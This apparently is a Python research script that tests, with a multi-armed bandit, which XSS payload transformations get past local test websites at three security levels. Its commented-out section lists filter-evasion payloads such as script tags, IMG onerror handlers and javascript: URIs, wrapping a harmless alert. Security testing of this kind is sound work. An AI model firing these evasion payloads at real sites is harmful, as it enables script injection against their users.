import requests
import random
from bfts.bandit import Bandit

#random.seed(1)

# does not work with dynamic arms
# def n_arms():
#     return len(XSS_transformations())

def XSS_transformations(n_arms):
    return create_XSS_transformations(n_arms) # fill this list with functions that take one argument (a payload) and transform it in a certain way

def XSS_bandit(n_arms: int):
    base_payload = "alert('Hi!')"
    transformations_ = XSS_transformations(n_arms)
    #print(f"the transformations are {transformations_}")
    transformed_payloads = list(transformation(base_payload) for transformation in transformations_)
    print(transformed_payloads)
    random.Random(1).shuffle(transformed_payloads) # The seed of this shuffle decides what technique will be associated with each arm
    def reward_fn(payload_):
        return lambda: send_and_get_result(payload_)
    arms = list(map(reward_fn, transformed_payloads))
    return Bandit(arms)

# create a session so each new get request does not establish a new connection
session = requests.Session()
    
def send_and_get_result(payload_):
    engine_to_ip_dict = {"weak_security_website": "http://127.0.0.1:8000", "medium_security_website": "http://127.0.0.1:8001", "strict_security_website": "http://127.0.0.1:8002"}

    # 1st choose which server to send it to (which browser engine)
    engines = ["weak_security_website", "medium_security_website", "strict_security_website"]
    engine = random.choice(engines)
    ip = engine_to_ip_dict[engine]

    #print(f"sending packet to {engine}")

    # 2nd send the payload to that server
    full_ip = ip + "/search/?q=" + str(payload_)
    r = session.get(full_ip)

    # 3rd receive a HTTP response of that server (this will be either 200 (success) or 404 (fail))
    status = r.status_code

    print(f"stuur {payload_} naar {engine}, dit is de status {status}")

    # 4th return this response
    if status == 200:
        # print("giving 1")
        return 1
    elif status == 404:
        # print("not giving them anything")
        return 0

# Simulations of XSS transformations:

# Creates a technique that returns the same identifier that it has in its name
def create_technique(number):

    def transformation(base_payload: str):
        return number
    
    transformation.__name__="transformation_" + str(number)

    return transformation

# Creates a list of functions that have incremented identifiers
def create_XSS_transformations(amount: int):
    all_techniques = []

    for i in range(1, amount+1):
        technique = create_technique(i)
        all_techniques.append(technique)

    return all_techniques

if __name__ == "__main__":
    transformations = create_XSS_transformations(20)
    outputs = [transform("test") for transform in transformations]
    print(outputs)

    for x in range(8192):
        full_ip = "http://127.0.0.1:8000" + "/search/?q=" + str(1)
        r = requests.get(full_ip)

        print(x)
        status = r.status_code

        print(status)

    # base_payload = "alert('Hi!')"
    # transformations_ = XSS_transformations(20)
    # print(f"the transformations are {transformations_}")
    # transformed_payloads = list(transformation(base_payload) for transformation in transformations_)
    # print(f"these are the transformed payloads {transformed_payloads}")
    # #random.Random(1).shuffle(transformed_payloads) # The seed of this shuffle decides what technique will be associated with each arm
    # def reward_fn(payload_):
    #     return lambda: send_and_get_result(payload_)
    # arms = list(map(reward_fn, transformed_payloads))

    # for x in range(4):
    #     arm = random.choice(arms)
    #     reward = arm()
    #     print(f"This is the reward {reward}")
    pass



# manually defined transformations: 

# def transformation_1(base_payload: str):
#     return 1

# def transformation_2(base_payload: str):
#     return 2

# def transformation_3(base_payload: str):
#     return 3

# def transformation_4(base_payload: str):
#     return 4

# def transformation_5(base_payload: str):
#     return 5

# def transformation_6(base_payload: str):
#     return 6

# def transformation_7(base_payload: str):
#     return 7

# def transformation_8(base_payload: str):
#     return 8

# def transformation_9(base_payload: str):
#     return 9

# def transformation_10(base_payload: str):
#     return 10

# def transformation_11(base_payload: str):
#     return 11

# def transformation_12(base_payload: str):
#     return 12

# def transformation_13(base_payload: str):
#     return 13

# def transformation_14(base_payload: str):
#     return 14

# def transformation_15(base_payload: str):
#     return 15

# def transformation_16(base_payload: str):
#     return 16

# def transformation_17(base_payload: str):
#     return 17

# def transformation_18(base_payload: str):
#     return 18

# def transformation_19(base_payload: str):
#     return 19

# def transformation_20(base_payload: str):
#     return 20



# Properly implemented XSS payload transformations

# def script_tags(base_payload: str):
#     return "<script>" + base_payload + "</script>"

# def non_alpha_non_digit(base_payload: str):
#     return "<script\XSS>" + base_payload + "</script>"

# def malformed_IMG_tags(base_payload: str):
#     return "<IMG \"\"\"><script>" + base_payload + "</script>\"\\>"

# def on_error_alert(base_payload: str):
#     return "<IMG SRC=/ onerror=\"" + base_payload + "\"></img>" # can also change the text inside the alert to String.fromCharCode(num, num, num) if you want to completely remove quotes from the payload

# def extraneous_open_brackets(base_payload: str):
#     return "<script>" + base_payload + ";//\<</script>"

# def end_title_tag(base_payload: str):
#     return "</TITLE><script>" + base_payload + ";</script>"

# def input_image(base_payload: str):
#     return "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:" + base_payload + ";\">"

# def body_image(base_payload: str):
#     return "<BODY BACKGROUND=\"javascript:" + base_payload + "\">"

# def IMG_Dynsrc(base_payload: str):
#     return "<IMG DYNSRC=\"javascript:" + base_payload + "\">"

# def IMG_Lowsrc(base_payload: str):
#     return "<IMG LOWSRC=\"javascript:" + base_payload + "\">"
